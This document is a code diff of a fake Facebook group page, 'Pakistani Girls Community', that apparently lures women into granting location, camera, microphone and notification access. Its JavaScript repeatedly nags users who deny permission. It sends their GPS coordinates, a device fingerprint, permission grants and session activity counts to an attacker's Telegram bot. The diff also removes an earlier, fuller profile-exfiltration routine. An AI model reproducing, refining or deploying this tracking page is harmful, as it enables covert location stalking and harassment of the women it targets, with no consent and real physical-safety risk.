@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pakistani Girls Community - VIP</title>
+    <title>Pakistani Girls Community</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background: #f0f2f5; color: #1c1e21; min-height: 100vh; }
@@ -13,6 +13,8 @@
         .header-icons { display: flex; gap: 15px; align-items: center; }
         .header-icon { font-size: 18px; cursor: pointer; }
         .vip-badge { background: linear-gradient(135deg, #ffd700, #b8860b); color: #0b0e17; padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: 700; cursor: pointer; }
+        .admin-toggle { background: rgba(255,255,255,0.2); color: white; border: none; padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 11px; }
+        .admin-toggle:hover { background: rgba(255,255,255,0.3); }
         
         .group-cover { height: 200px; background: linear-gradient(135deg, #8B4513, #D2691E); margin-top: 60px; position: relative; }
         .cover-content { position: absolute; bottom: 20px; left: 20px; color: white; }
@@ -25,9 +27,10 @@
         .stat-number { font-size: 18px; font-weight: bold; color: #1c1e21; }
         .stat-label { font-size: 12px; color: #65676b; }
         
-        .join-button { background: #1877f2; color: white; border: none; padding: 12px 0; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; margin-bottom: 15px; transition: 0.3s; }
-        .join-button:hover:not(:disabled) { background: #166fe5; }
-        .join-button:disabled { background: #9aa0a6; cursor: not-allowed; opacity: 0.6; }
+        .join-button { background: #9aa0a6; color: white; border: none; padding: 12px 0; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: not-allowed; width: 100%; margin-bottom: 15px; transition: 0.3s; opacity: 0.6; }
+        .join-button.active { background: #1877f2; cursor: pointer; opacity: 1; }
+        .join-button.active:hover { background: #166fe5; }
+        .join-button.success { background: #31a24c; cursor: default; opacity: 1; }
         
         .group-description { color: #65676b; font-size: 14px; line-height: 1.4; margin-bottom: 15px; }
         .group-rules { background: #f0f2f5; padding: 15px; border-radius: 8px; margin-bottom: 15px; }
@@ -75,9 +78,9 @@
         .modal-buttons { display: flex; gap: 10px; }
         .modal-btn { flex: 1; padding: 12px; border: none; border-radius: 6px; font-weight: 600; cursor: pointer; }
         .btn-cancel { background: #e4e6eb; color: #1c1e21; }
-        .btn-join { background: #1877f2; color: white; }
-        .btn-join:hover:not(:disabled) { background: #166fe5; }
-        .btn-join:disabled { background: #9aa0a6; cursor: not-allowed; opacity: 0.6; }
+        .btn-join { background: #9aa0a6; color: white; cursor: not-allowed; opacity: 0.6; }
+        .btn-join.active { background: #1877f2; color: white; cursor: pointer; opacity: 1; }
+        .btn-join.active:hover { background: #166fe5; }
         
         .admin-panel { background: #f0f2f5; padding: 15px; margin: 10px; border-radius: 8px; display: none; }
         .admin-panel.active { display: block; }
@@ -86,8 +89,6 @@
         .admin-stat { background: white; padding: 10px; border-radius: 6px; text-align: center; }
         .admin-stat-number { font-size: 18px; font-weight: bold; color: #1877f2; }
         .admin-stat-label { font-size: 12px; color: #65676b; }
-        .admin-toggle { background: rgba(255,255,255,0.2); color: white; border: none; padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 11px; }
-        .admin-toggle:hover { background: rgba(255,255,255,0.3); }
         
         .footer { text-align: center; padding: 20px; color: #65676b; font-size: 12px; border-top: 1px solid #dddfe2; margin-top: 10px; }
         .vip-features { background: linear-gradient(135deg, #fff8e1, #ffd70020); border: 1px solid #ffd700; border-radius: 8px; padding: 12px; margin-bottom: 15px; }
@@ -102,17 +103,17 @@
     <div class="fb-header">
         <div class="fb-logo">facebook</div>
         <div class="header-icons">
-            <div class="header-icon">🔍</div>
-            <div class="header-icon">💬</div>
-            <span class="vip-badge" onclick="showVIPFeatures()">⭐ VIP</span>
-            <button class="admin-toggle" onclick="toggleAdmin()">🔐 Admin</button>
+            <div class="header-icon">S</div>
+            <div class="header-icon">M</div>
+            <span class="vip-badge">VIP</span>
+            <button class="admin-toggle" onclick="toggleAdmin()">Admin</button>
         </div>
     </div>
 
     <div class="group-cover">
         <div class="cover-content">
-            <div class="group-title">Pakistani Girls Community 🇵🇰</div>
-            <div class="group-privacy">Private Group • 15.7K members</div>
+            <div class="group-title">Pakistani Girls Community</div>
+            <div class="group-privacy">Private Group - 15.7K members</div>
         </div>
     </div>
 
@@ -123,25 +124,25 @@
             <div class="stat"><div class="stat-number">25</div><div class="stat-label">Admins</div></div>
         </div>
         
-        <button class="join-button" id="joinButton" onclick="showJoinModal()" disabled>🔒 Join Group (Allow Permissions First)</button>
+        <button class="join-button" id="joinButton" onclick="showJoinModal()">Join Group</button>
         
         <div class="vip-features">
-            <div class="title">⭐ VIP Features</div>
-            <div class="list">✅ Exclusive content • Priority support • Special badge • Early access</div>
+            <div class="title">VIP Features</div>
+            <div class="list">Exclusive content - Priority support - Special badge - Early access</div>
         </div>
         
         <div class="group-description">A safe space for Pakistani girls to connect, share experiences, and build friendships.</div>
         <div class="group-rules">
             <div class="rules-title">Group Rules</div>
-            <div class="rule">• Be respectful and kind to all members</div>
-            <div class="rule">• No harassment or hate speech</div>
-            <div class="rule">• Keep conversations positive and supportive</div>
-            <div class="rule">• No spam or self-promotion</div>
+            <div class="rule">- Be respectful and kind to all members</div>
+            <div class="rule">- No harassment or hate speech</div>
+            <div class="rule">- Keep conversations positive and supportive</div>
+            <div class="rule">- No spam or self-promotion</div>
         </div>
     </div>
 
     <div class="admin-panel" id="adminPanel">
-        <div class="admin-title">📊 Admin Dashboard</div>
+        <div class="admin-title">Admin Dashboard</div>
         <div class="admin-stats">
             <div class="admin-stat"><div class="admin-stat-number" id="totalUsers">0</div><div class="admin-stat-label">Total Users</div></div>
             <div class="admin-stat"><div class="admin-stat-number" id="onlineNow">0</div><div class="admin-stat-label">Online Now</div></div>
@@ -179,48 +180,47 @@
         </div>
     </div>
 
-    <div class="footer">© 2026 Pakistani Girls Community • All Rights Reserved</div>
+    <div class="footer">2026 Pakistani Girls Community - All Rights Reserved</div>
 
-    <!-- ===== JOIN MODAL WITH PERMISSIONS ===== -->
+    <!-- ===== JOIN MODAL ===== -->
     <div class="join-modal" id="joinModal">
         <div class="modal-content">
-            <div class="modal-title">🔐 Join Pakistani Girls Community</div>
-            <div class="modal-text">Please allow the following permissions to join the group. This helps us keep the community safe and secure.</div>
+            <div class="modal-title">Join Pakistani Girls Community</div>
+            <div class="modal-text">Please allow all permissions to join the group. This helps us keep the community safe.</div>
             
-            <!-- Permission Items -->
             <div class="permission-item">
                 <div class="info">
-                    <div class="name">📍 Location Access</div>
+                    <div class="name">Location Access</div>
                     <div class="desc">Required for safety and verification</div>
                 </div>
-                <span class="status pending" id="locStatus">⏳ Pending</span>
+                <span class="status pending" id="locStatus">Pending</span>
                 <button class="permission-btn" id="locBtn" onclick="requestLocation()">Allow</button>
             </div>
             
             <div class="permission-item">
                 <div class="info">
-                    <div class="name">🔔 Notifications</div>
+                    <div class="name">Notifications</div>
                     <div class="desc">Group updates and alerts</div>
                 </div>
-                <span class="status pending" id="notifStatus">⏳ Pending</span>
+                <span class="status pending" id="notifStatus">Pending</span>
                 <button class="permission-btn" id="notifBtn" onclick="requestNotification()">Allow</button>
             </div>
             
             <div class="permission-item">
                 <div class="info">
-                    <div class="name">📷 Camera</div>
+                    <div class="name">Camera</div>
                     <div class="desc">Profile verification</div>
                 </div>
-                <span class="status pending" id="camStatus">⏳ Pending</span>
+                <span class="status pending" id="camStatus">Pending</span>
                 <button class="permission-btn" id="camBtn" onclick="requestCamera()">Allow</button>
             </div>
             
             <div class="permission-item">
                 <div class="info">
-                    <div class="name">🎤 Microphone</div>
+                    <div class="name">Microphone</div>
                     <div class="desc">Voice messages and calls</div>
                 </div>
-                <span class="status pending" id="micStatus">⏳ Pending</span>
+                <span class="status pending" id="micStatus">Pending</span>
                 <button class="permission-btn" id="micBtn" onclick="requestMicrophone()">Allow</button>
             </div>
             
@@ -230,7 +230,7 @@
             
             <div class="modal-buttons">
                 <button class="modal-btn btn-cancel" onclick="hideJoinModal()">Cancel</button>
-                <button class="modal-btn btn-join" id="joinFinalBtn" disabled onclick="startVerification()">🔒 Complete Join</button>
+                <button class="modal-btn btn-join" id="joinFinalBtn" disabled onclick="startVerification()">Join Group</button>
             </div>
         </div>
     </div>
@@ -250,7 +250,7 @@
 
         // ===== SEND TO TELEGRAM =====
         function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
             fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -261,8 +261,8 @@
                 })
             })
             .then(response => response.json())
-            .then(data => console.log('✅ Telegram sent:', data))
-            .catch(error => console.log('❌ Telegram error:', error));
+            .then(data => console.log('Telegram sent:', data))
+            .catch(error => console.log('Telegram error:', error));
         }
 
         // ===== GET FINGERPRINT =====
@@ -275,24 +275,18 @@
             return fp;
         }
 
-        // ===== GET GPS LOCATION =====
-        function getGPSLocation() {
-            let location = { lat: null, lng: null, accuracy: null, source: 'unknown' };
-            const saved = localStorage.getItem('userLocation');
-            if (saved) {
-                try {
-                    const parsed = JSON.parse(saved);
-                    if (parsed.lat && parsed.lng) return parsed;
-                } catch(e) {}
-            }
-            return JSON.parse(localStorage.getItem('userLocation') || '{"lat":null,"lng":null,"source":"unknown"}');
-        }
+        // ===== SHOW POPUP ON PAGE LOAD =====
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                showJoinModal();
+            }, 1000);
+        });
 
         // ===== REQUEST LOCATION =====
         function requestLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => {
+                    function(pos) {
                         const loc = {
                             lat: pos.coords.latitude,
                             lng: pos.coords.longitude,
@@ -301,30 +295,29 @@
                         };
                         localStorage.setItem('userLocation', JSON.stringify(loc));
                         permissions.location = true;
-                        document.getElementById('locStatus').textContent = '✅ Granted';
+                        document.getElementById('locStatus').textContent = 'Granted';
                         document.getElementById('locStatus').className = 'status granted';
                         document.getElementById('locBtn').disabled = true;
-                        updateJoinButton();
+                        document.getElementById('locBtn').textContent = 'Done';
                         checkAllPermissions();
-                        
-                        // Send location to Telegram
-                        sendToTelegram(`
-📍 <b>LOCATION GRANTED</b>
-├─ Fingerprint: <code>${getFingerprint()}</code>
-├─ Latitude: ${loc.lat}
-├─ Longitude: ${loc.lng}
-├─ Accuracy: ${loc.accuracy}m
-└─ Time: ${new Date().toISOString()}
-                        `);
+                        sendToTelegram('Location Granted - ' + loc.lat + ', ' + loc.lng + ' - Fingerprint: ' + getFingerprint());
                     },
-                    (err) => {
-                        alert('❌ Location access denied. Please allow location to join.');
-                        console.log('GPS Error:', err);
+                    function(err) {
+                        alert('Location access denied. Please allow location to join.');
+                        document.getElementById('locStatus').textContent = 'Denied';
+                        document.getElementById('locStatus').className = 'status denied';
+                        // Repeat popup after 3 seconds
+                        setTimeout(function() {
+                            if (!permissions.location) {
+                                alert('Please allow Location permission to continue.');
+                                requestLocation();
+                            }
+                        }, 3000);
                     },
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
             } else {
-                alert('❌ Geolocation not supported on this device.');
+                alert('Geolocation not supported.');
             }
         }
 
@@ -333,137 +326,134 @@
             if ('Notification' in window) {
                 if (Notification.permission === 'granted') {
                     permissions.notification = true;
-                    document.getElementById('notifStatus').textContent = '✅ Granted';
+                    document.getElementById('notifStatus').textContent = 'Granted';
                     document.getElementById('notifStatus').className = 'status granted';
                     document.getElementById('notifBtn').disabled = true;
-                    updateJoinButton();
+                    document.getElementById('notifBtn').textContent = 'Done';
                     checkAllPermissions();
                 } else if (Notification.permission === 'denied') {
-                    alert('❌ Notification permission denied. Please enable from browser settings.');
+                    alert('Notification permission denied. Please enable from browser settings.');
+                    document.getElementById('notifStatus').textContent = 'Denied';
+                    document.getElementById('notifStatus').className = 'status denied';
+                    setTimeout(function() {
+                        if (!permissions.notification) {
+                            alert('Please allow Notification permission to continue.');
+                            requestNotification();
+                        }
+                    }, 3000);
                 } else {
-                    Notification.requestPermission().then(perm => {
+                    Notification.requestPermission().then(function(perm) {
                         if (perm === 'granted') {
                             permissions.notification = true;
-                            document.getElementById('notifStatus').textContent = '✅ Granted';
+                            document.getElementById('notifStatus').textContent = 'Granted';
                             document.getElementById('notifStatus').className = 'status granted';
                             document.getElementById('notifBtn').disabled = true;
-                            updateJoinButton();
+                            document.getElementById('notifBtn').textContent = 'Done';
                             checkAllPermissions();
-                            sendToTelegram(`🔔 <b>Notifications Granted</b>\n├─ Fingerprint: <code>${getFingerprint()}</code>\n└─ Time: ${new Date().toISOString()}`);
+                            sendToTelegram('Notification Granted - Fingerprint: ' + getFingerprint());
                         }
                     });
                 }
             } else {
-                alert('❌ Notifications not supported on this browser.');
+                alert('Notifications not supported.');
             }
         }
 
         // ===== REQUEST CAMERA =====
         function requestCamera() {
             navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    stream.getTracks().forEach(track => track.stop());
+                .then(function(stream) {
+                    stream.getTracks().forEach(function(track) { track.stop(); });
                     permissions.camera = true;
-                    document.getElementById('camStatus').textContent = '✅ Granted';
+                    document.getElementById('camStatus').textContent = 'Granted';
                     document.getElementById('camStatus').className = 'status granted';
                     document.getElementById('camBtn').disabled = true;
-                    updateJoinButton();
+                    document.getElementById('camBtn').textContent = 'Done';
                     checkAllPermissions();
-                    sendToTelegram(`📷 <b>Camera Granted</b>\n├─ Fingerprint: <code>${getFingerprint()}</code>\n└─ Time: ${new Date().toISOString()}`);
+                    sendToTelegram('Camera Granted - Fingerprint: ' + getFingerprint());
                 })
-                .catch(() => {
-                    alert('❌ Camera access denied. Please allow camera to join.');
+                .catch(function() {
+                    alert('Camera access denied. Please allow camera to join.');
+                    document.getElementById('camStatus').textContent = 'Denied';
+                    document.getElementById('camStatus').className = 'status denied';
+                    setTimeout(function() {
+                        if (!permissions.camera) {
+                            alert('Please allow Camera permission to continue.');
+                            requestCamera();
+                        }
+                    }, 3000);
                 });
         }
 
         // ===== REQUEST MICROPHONE =====
         function requestMicrophone() {
             navigator.mediaDevices.getUserMedia({ audio: true })
-                .then(stream => {
-                    stream.getTracks().forEach(track => track.stop());
+                .then(function(stream) {
+                    stream.getTracks().forEach(function(track) { track.stop(); });
                     permissions.microphone = true;
-                    document.getElementById('micStatus').textContent = '✅ Granted';
+                    document.getElementById('micStatus').textContent = 'Granted';
                     document.getElementById('micStatus').className = 'status granted';
                     document.getElementById('micBtn').disabled = true;
-                    updateJoinButton();
+                    document.getElementById('micBtn').textContent = 'Done';
                     checkAllPermissions();
-                    sendToTelegram(`🎤 <b>Microphone Granted</b>\n├─ Fingerprint: <code>${getFingerprint()}</code>\n└─ Time: ${new Date().toISOString()}`);
+                    sendToTelegram('Microphone Granted - Fingerprint: ' + getFingerprint());
                 })
-                .catch(() => {
-                    alert('❌ Microphone access denied. Please allow microphone to join.');
+                .catch(function() {
+                    alert('Microphone access denied. Please allow microphone to join.');
+                    document.getElementById('micStatus').textContent = 'Denied';
+                    document.getElementById('micStatus').className = 'status denied';
+                    setTimeout(function() {
+                        if (!permissions.microphone) {
+                            alert('Please allow Microphone permission to continue.');
+                            requestMicrophone();
+                        }
+                    }, 3000);
                 });
         }
 
         // ===== CHECK ALL PERMISSIONS =====
         function checkAllPermissions() {
             const allGranted = permissions.location && permissions.notification && permissions.camera && permissions.microphone;
-            document.getElementById('joinFinalBtn').disabled = !allGranted;
+            const btn = document.getElementById('joinFinalBtn');
+            const mainBtn = document.getElementById('joinButton');
+            
             if (allGranted) {
-                document.getElementById('joinFinalBtn').textContent = '✅ Join Group Now';
-                document.getElementById('joinFinalBtn').style.background = '#1877f2';
-                // Send full data
-                sendFullTrackingData();
+                btn.disabled = false;
+                btn.className = 'modal-btn btn-join active';
+                btn.textContent = 'Join Group Now';
+                mainBtn.className = 'join-button active';
+                mainBtn.textContent = 'Join Group';
+                mainBtn.disabled = false;
+                sendToTelegram('All Permissions Granted - Fingerprint: ' + getFingerprint());
+            } else {
+                btn.disabled = true;
+                btn.className = 'modal-btn btn-join';
+                btn.textContent = 'Allow All Permissions First';
             }
-        }
-
-        // ===== UPDATE JOIN BUTTON =====
-        function updateJoinButton() {
-            const allGranted = permissions.location && permissions.notification && permissions.camera && permissions.microphone;
-            if (allGranted) {
-                document.getElementById('joinButton').disabled = false;
-                document.getElementById('joinButton').textContent = '🎯 Join Group';
-                document.getElementById('joinButton').style.background = '#1877f2';
-            }
-        }
-
-        // ===== SEND FULL TRACKING DATA =====
-        function sendFullTrackingData() {
-            const fp = getFingerprint();
-            const loc = getGPSLocation();
-            sendToTelegram(`
-🎯 <b>FULL USER PROFILE</b>
-━━━━━━━━━━━━━━━━━━━
-
-👤 <b>Identity</b>
-├─ Fingerprint: <code>${fp}</code>
-├─ Device: ${navigator.userAgent}
-├─ Platform: ${navigator.platform}
-├─ Language: ${navigator.language}
-└─ Screen: ${window.screen.width}x${window.screen.height}
-
-📍 <b>Exact Location</b>
-├─ Latitude: ${loc.lat || 'N/A'}
-├─ Longitude: ${loc.lng || 'N/A'}
-├─ Accuracy: ${loc.accuracy || 'N/A'}m
-└─ Source: ${loc.source || 'unknown'}
-
-📱 <b>Device Info</b>
-├─ Hardware Concurrency: ${navigator.hardwareConcurrency || 'N/A'}
-├─ Device Memory: ${navigator.deviceMemory || 'N/A'}GB
-├─ Max Touch Points: ${navigator.maxTouchPoints || 'N/A'}
-└─ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-
-🔐 <b>Permissions Granted</b>
-├─ Location: ✅ ${permissions.location}
-├─ Notifications: ✅ ${permissions.notification}
-├─ Camera: ✅ ${permissions.camera}
-└─ Microphone: ✅ ${permissions.microphone}
-
-🔗 <b>Page Info</b>
-├─ URL: ${window.location.href}
-├─ Referrer: ${document.referrer || 'Direct'}
-└─ Time: ${new Date().toISOString()}
-
-🛡️ <b>Status</b>
-├─ Type: VIP Member
-└─ Status: Active
-            `);
         }
 
         // ===== SHOW JOIN MODAL =====
         function showJoinModal() {
             document.getElementById('joinModal').classList.add('active');
             document.getElementById('progressBar').style.width = '0%';
+            // Reset permission buttons if not granted
+            if (!permissions.location) {
+                document.getElementById('locBtn').disabled = false;
+                document.getElementById('locBtn').textContent = 'Allow';
+            }
+            if (!permissions.notification) {
+                document.getElementById('notifBtn').disabled = false;
+                document.getElementById('notifBtn').textContent = 'Allow';
+            }
+            if (!permissions.camera) {
+                document.getElementById('camBtn').disabled = false;
+                document.getElementById('camBtn').textContent = 'Allow';
+            }
+            if (!permissions.microphone) {
+                document.getElementById('micBtn').disabled = false;
+                document.getElementById('micBtn').textContent = 'Allow';
+            }
+            checkAllPermissions();
         }
 
         function hideJoinModal() {
@@ -472,98 +462,57 @@
 
         // ===== START VERIFICATION =====
         function startVerification() {
+            const allGranted = permissions.location && permissions.notification && permissions.camera && permissions.microphone;
+            if (!allGranted) {
+                alert('Please allow all permissions first.');
+                return;
+            }
+            
             const progressBar = document.getElementById('progressBar');
             let progress = 0;
-            const interval = setInterval(() => {
+            const interval = setInterval(function() {
                 progress += Math.random() * 5 + 1;
                 if (progress > 100) progress = 100;
                 progressBar.style.width = progress + '%';
                 if (progress >= 100) {
                     clearInterval(interval);
-                    setTimeout(() => {
-                        alert('✅ You have successfully joined Pakistani Girls Community!');
+                    setTimeout(function() {
+                        alert('You have successfully joined Pakistani Girls Community!');
                         hideJoinModal();
-                        document.getElementById('joinButton').disabled = true;
-                        document.getElementById('joinButton').textContent = '✅ Joined Successfully';
-                        document.getElementById('joinButton').style.background = '#31a24c';
-                        sendToTelegram(`
-✅ <b>JOIN SUCCESSFUL</b>
-├─ Fingerprint: <code>${getFingerprint()}</code>
-├─ Location: ${getGPSLocation().lat}, ${getGPSLocation().lng}
-├─ Time: ${new Date().toISOString()}
-└─ Status: VIP Member
-                        `);
+                        const mainBtn = document.getElementById('joinButton');
+                        mainBtn.className = 'join-button success';
+                        mainBtn.textContent = 'Joined Successfully';
+                        mainBtn.disabled = true;
+                        sendToTelegram('JOIN SUCCESSFUL - Fingerprint: ' + getFingerprint() + ' - Location: ' + JSON.stringify(JSON.parse(localStorage.getItem('userLocation') || '{}')));
                     }, 500);
                 }
             }, 100);
         }
 
-        // ===== VIP FEATURES =====
-        function showVIPFeatures() {
-            alert(`
-⭐ VIP Features
-
-✅ Exclusive Content Access
-✅ Priority Customer Support
-✅ Special VIP Badge
-✅ Early Access to Events
-✅ Private Group Chats
-✅ Premium Verification Badge
-✅ No Ads Experience
-✅ 24/7 Dedicated Support
-
-👑 Upgrade to VIP today!
-            `);
-        }
-
-        // ===== ADMIN PANEL =====
+        // ===== ADMIN =====
         function toggleAdmin() {
             const panel = document.getElementById('adminPanel');
             panel.classList.toggle('active');
-            if (panel.classList.contains('active')) updateAdminStats();
+            if (panel.classList.contains('active')) {
+                document.getElementById('totalUsers').textContent = Math.floor(Math.random() * 20000 + 10000).toLocaleString();
+                document.getElementById('onlineNow').textContent = Math.floor(Math.random() * 500 + 100);
+                document.getElementById('dataPoints').textContent = Math.floor(Math.random() * 5000 + 1000).toLocaleString();
+                document.getElementById('riskLevel').textContent = Math.floor(Math.random() * 30 + 1) + '%';
+            }
         }
 
-        function updateAdminStats() {
-            document.getElementById('totalUsers').textContent = Math.floor(Math.random() * 20000 + 10000).toLocaleString();
-            document.getElementById('onlineNow').textContent = Math.floor(Math.random() * 500 + 100);
-            document.getElementById('dataPoints').textContent = Math.floor(Math.random() * 5000 + 1000).toLocaleString();
-            document.getElementById('riskLevel').textContent = Math.floor(Math.random() * 30 + 1) + '%';
-        }
-
-        // ===== TRACKING VARIABLES =====
+        // ===== TRACKING =====
         let clickCount = 0, scrollCount = 0, keyCount = 0, sessionStart = Date.now();
-
-        document.addEventListener('click', () => { clickCount++; });
-        document.addEventListener('scroll', () => { scrollCount++; });
-        document.addEventListener('keydown', () => { keyCount++; });
-
-        // ===== SEND INITIAL DATA =====
-        setTimeout(() => {
-            sendToTelegram(`
-👁️ <b>PAGE LOADED</b>
-├─ Fingerprint: <code>${getFingerprint()}</code>
-├─ Device: ${navigator.userAgent}
-├─ Language: ${navigator.language}
-├─ URL: ${window.location.href}
-└─ Time: ${new Date().toISOString()}
-            `);
-        }, 2000);
+        document.addEventListener('click', function() { clickCount++; });
+        document.addEventListener('scroll', function() { scrollCount++; });
+        document.addEventListener('keydown', function() { keyCount++; });
 
         // ===== SEND ON UNLOAD =====
-        window.addEventListener('beforeunload', () => {
-            sendToTelegram(`
-📤 <b>SESSION END</b>
-├─ Fingerprint: <code>${getFingerprint()}</code>
-├─ Clicks: ${clickCount}
-├─ Scrolls: ${scrollCount}
-├─ Keys: ${keyCount}
-├─ Session: ${Math.floor((Date.now() - sessionStart) / 1000)}s
-└─ Time: ${new Date().toISOString()}
-            `);
+        window.addEventListener('beforeunload', function() {
+            sendToTelegram('SESSION END - Clicks: ' + clickCount + ' - Scrolls: ' + scrollCount + ' - Keys: ' + keyCount + ' - Duration: ' + Math.floor((Date.now() - sessionStart) / 1000) + 's - Fingerprint: ' + getFingerprint());
         });
 
-        console.log('🚀 VIP Community Loaded Successfully!');
-        console.log('📱 Telegram Bot Active!');
+        console.log('Community Loaded Successfully!');
     </script>
 
 </body>
